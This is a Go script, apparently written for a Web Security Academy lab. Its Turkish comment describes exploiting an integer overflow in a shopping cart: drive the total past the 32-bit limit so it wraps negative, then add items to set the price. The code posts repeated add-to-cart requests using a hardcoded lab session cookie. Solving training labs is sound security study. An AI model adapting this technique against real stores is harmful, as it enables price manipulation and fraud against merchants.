package main

/*
Buradaki mantık sepet toplamının 2,147,483,647 sayısından fazla olması anlamına gelmekte
Eğer sepet toplamı int değerini geçer ise -2,147,483,647 olup eksiden devam etmekte
sepet toplamının istenilen kadar olması için brute force yapıyoruz
Ondan sonra negatif değerden çıkması için farklı ürünler sepete ekliyoruz

*/

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)

var (
	url_    = "https://ac2b1f951e474a61c077517000e80071.web-security-academy.net/cart"
	session = "4FmKdMIDYEh4Rwu2ZBf6TLipyHQY7F0H"
)

func main() {
	pentest()
}

func pentest() {

	var wg sync.WaitGroup
	wg.Add(1)
	for i := 0; i < 1; i++ {

		go func(i int) {
			defer wg.Done()
			sendReq()
		}(i)
	}

	wg.Wait()
	fmt.Println("END!")
}

func sendReq() {
	//302 handle edebilmek için
	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	postData := url.Values{}
	postData.Set("productId", "1")
	postData.Set("quantity", "47")
	postData.Set("redir", "CART")
	req, _ := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))

	req.Header.Add("Cookie", "session="+session)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(res.Status))

}
